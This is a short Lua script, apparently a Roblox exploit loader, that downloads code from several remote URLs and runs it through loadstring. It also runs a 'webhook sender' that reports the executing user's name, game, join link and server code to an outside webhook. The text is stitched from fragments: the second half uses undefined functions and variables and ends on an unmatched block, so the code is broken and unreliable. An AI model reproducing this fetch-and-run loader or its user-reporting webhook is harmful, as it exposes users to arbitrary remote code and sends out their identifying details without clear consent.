-- Function to safely load scripts
local function safeLoad(url)
    local success, result = pcall(function()
        return loadstring(game:HttpGet(url))()
    end)
    if not success then
        warn("Failed to load script from:", url, "\nError:", result)
    end
end

-- Delay before loaders start
local DELAY = 8

-- Step 1: Run webhook sender
safeLoad("https://raw.githubusercontent.com/yuunii-1/Files/main/SendDchook.lua")

-- Step 2: Wait before running loaders
task.wait(DELAY)

-- Step 3: Load the two main scripts
safeLoad("https://raw.githubusercontent.com/Lunorhubb/LunorScript/main/Loader.lua")
safeLoad("https://lunor.dev/loader")
    -- Build webhook description
    local description = string.format(
        "✅ **Script executed by:** %s (`%s`)\n🎮 **Game:** %s\n📌 **Place ID:** %d\n🔗 **Join Link:** %s\n🖥️ **Server Code:** %s\n⏳ Loader starting in %d seconds...",
        displayName,
        username,
        placeName,
        placeId,
        joinLink,
        jobId,
        DELAY
    )

    -- Send webhook
    sendEmbed("🚀 Loader Pending", description, 0xFFFF00) -- Yellow

    -- Wait before running loaders
    wait(DELAY)

    -- Load scripts
    safeLoad("https://lunor.dev/loader")
    safeLoad("https://raw.githubusercontent.com/Lunorhubb/LunorScript/refs/heads/main/Loader.lua")
end)
